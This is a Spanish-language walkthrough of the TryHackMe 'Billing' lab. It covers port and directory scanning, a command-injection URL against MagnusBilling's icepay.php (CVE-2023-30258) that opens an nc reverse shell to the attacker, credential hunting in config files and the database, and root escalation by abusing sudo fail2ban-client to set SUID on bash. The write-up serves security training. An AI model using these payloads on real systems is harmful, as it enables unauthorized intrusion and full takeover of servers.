---
title: Billing
description: Write Up máquina Billing de Try Hack Me
published: true
date: 2025-05-06T16:33:37.224Z
tags: write up
editor: markdown
dateCreated: 2025-05-06T15:23:46.118Z
---

# Billing
Bienvenido, va a encontrar el write up de la máquina Billing de TryHackMe.

## Reconocimiento
Lo primero que vamos a hacer es un comando básico de detección de puertos mediante nmap. Por lo tanto el comando será
```nmap
nmap -sT -Pn -sV {IP} 
```
![Uso de Nmap](/imagenes/billing-1.png)

Podemos observar como tenemos 3 puertos abiertos.
- Puerto 22: Para conexiones SSH
- Puerto 80: Para conexiones http
- Puerto 3306: Para base de datos SQL

Vamos a hacer un dirb para analizar todos las entradas disponibles en el website.
```
dirb http://{IP}
```
![Uso de Dirb](/imagenes/billing-2.png)

Observamos que tenemos robots.txt disponibles, por lo que vamos a entrar para observar que hay.

![Información de robots](/imagenes/billing-4.png)

No hay mucha información, por lo que vamos a ir al index normal.

![Login](/imagenes/billing-3.png)

Como podemos observar, parece un login clásico, sin embargo si nos fijamos en la ventana podemos observar el nombre del software que es MagnusBilling.

Si nos vamos al website oficial podemos observar información de que usa un Framework de Javascript llamado ExtJS 6.2.0.981, esta versión es vulnerable según el CVE-2023-30258.

## Explotación
Ahora que tenemos el plan, vamos a ejecutar el script para poder hacer la shell reversa. 

Lo primero que vamos a hacer es un puerto de escucha con:
```
nc -lnvp 443
```

Luego vamos a escribir lo siguiente, lo cúal consiste en una ejecución de comando de forma remota mediante el path.

'http://{IP máquina}/mbilling/lib/icepay/icepay.php?democ=iamhacked;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP atacante}10.9.3.144 443 >/tmp/f;#'

![Puerto de escucha](/imagenes/billing-5.png)
Tras esto vamos a comprobar que usuario somos, con un id básico.

![ID](/imagenes/billing-6.png)

Como podemos observar somos el usuario asterisk


Ahora lo que haremos será dirigirnos a /var/www/html/mbilling, donde vamos a analizar el contenido del index.php, para ver que configuración usa para el login.

![Info index.html](/imagenes/billing-7.png)

Como podemos observar, el archivo que nos interesa es uno ubicado en /protected/config y se llama main.php, ya que parece que está toda la información.


Mirando el archivo podemos observar que toma la configuración de login de otro archivo de configuración llamado res_config_mysql.conf, ubicado en /etc/asterisk/res_config_mysql.conf.

![Info .php](/imagenes/billing-8.png)

Vamos a entrar en la base de datos para ver si podemos acceder al website.

Antes vamos a securizar la shell mediante:
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Tras esto hacemos <kbd>Ctrl</kbd> + <kbd>Z </kbd>. y ponemos stty raw -echo;fg

Le damos a enter dos veces y ponemos export TERM=xterm.

![Información login](/imagenes/billing-10.png)

Tras esto vamos a acceder a la base de datos como íbamos a hacer en un principio.

Podemos observar como tenemos una base de datos llamada mbilling, es la que usaremos y dentro tenemos muchas tablas, pero la que nos interesa se llama pkg_user. Por lo que vamos a hacer
```mysql
SELECT * FROM pkg_user;
```

Lamentablemente la información es demasiado densa para entender.

![Info BBDD](/imagenes/billing-11.png)

Deberíamos descifrar la contraseña para poder acceder al usuario, sin embargo para completar la máquina no es necesario.

## Finalización
Ahora vamos a comprobar si tenemos la flag en el Home del usuario, sin embargo podemos observar que no hay, por lo que vamos a comprobar usuarios existentes y buscaremos la flag ahí.


![Flag user](/imagenes/billing-12.png)


Ahora vamos a comprobar que comandos podemos hacer mediante el uso de sudo -l

![Sudo -l](/imagenes/billing-13.png)


Como podemos observar, somos capaces de ejecutar el comando fail2ban-client, como root sin problema. 
```
sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```
Este comando hace que cuando fail2ban detecte una IP que no debería entrar, su sentencia es que ejecute el comando /bin/bash, como root.

También es necesario autobanear nuestra propia IP, para ello ponemos
```
sudo /usr/bin/fail2ban-client set asterisk-iptables banip {IP}
```

![Baneo](/imagenes/billing-14.png)

Tras esto, podemos crear una nueva shell con
```bash
bash -p
```

![Sudo -l](/imagenes/billing-15.png)

Tras esto podemos finalizar con la máquina ya que nos detecta que nuestra IP está vetada y por lo tanto nos inicia sesión como root, nos dirigimos al directorio de root y podemos usar el website.
![Fin](/imagenes/billing-16.png)


